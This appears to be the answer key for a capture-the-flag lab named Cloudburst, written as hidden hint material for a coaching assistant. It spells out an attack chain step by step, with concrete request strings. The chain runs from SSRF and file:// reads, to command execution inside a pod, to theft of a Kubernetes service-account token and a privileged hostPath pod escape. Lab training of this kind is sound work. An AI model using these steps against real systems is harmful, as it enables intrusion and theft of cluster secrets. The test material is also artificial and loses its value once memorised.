# Coach context — Cloudburst

Ground truth for the coach. Never quote verbatim; escalate per stage.

## Intended path

1. **edge-lfi**: `GET /preview?url=file:///srv/app/flag.txt` — urllib honours
   `file://`; the flag sits inside the public-web container.
2. Reach k8s01: `?url=http://k8s01/` → shop-app index → `?url=http://k8s01/
   exec?cmd=id` — RCE inside the pod, through the SSRF.
3. **pod-shell**: `?cmd=touch+/tmp/.pwned` → `check_flag`.
4. **api-secret**: `?cmd=cat+/etc/labflags/api-secret.txt` → submit.
5. **node-flag**: `?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/
   token` → curl the API FROM the pod: `?cmd=curl+-ks+-H+...` — secrets in
   prod are a decoy; create a privileged pod (hostPath /host, command
   `cat /host/root/k8s-flag.txt; sleep 30`) → GET its log → submit.
6. **chain-report**: `/root/cloudburst-report.txt` on kali containing the
   word "cloudburst" — a write-up deliverable, `check_flag`.

## Key facts (stage 2+ only)

- Inner commands inside `?url=` need ONE url-encode pass; quotes and nested
  JSON payloads for the API POST are the fiddly part — python3 requests is
  more reliable than nested curl quoting.
- shop-sa: secrets get/list, pods create, pods/log get — namespace prod.
- /host in the privileged pod = k8s01's root fs (kind extraMount).
- The prod secret app-config holds a decoy password + a hint string.

## Common wrong turns

- Trying to reach k8s01 directly — unrouted by design; SSRF only.
- Losing the inner `?cmd=` to quoting — build requests in python3, not raw
  bash-curl, once nesting gets deep.
- Hunting `pods/exec` RBAC — not granted; use pod `command` + `pods/log`.
- Forgetting the report flag — it's a write-up check, not a captured flag.
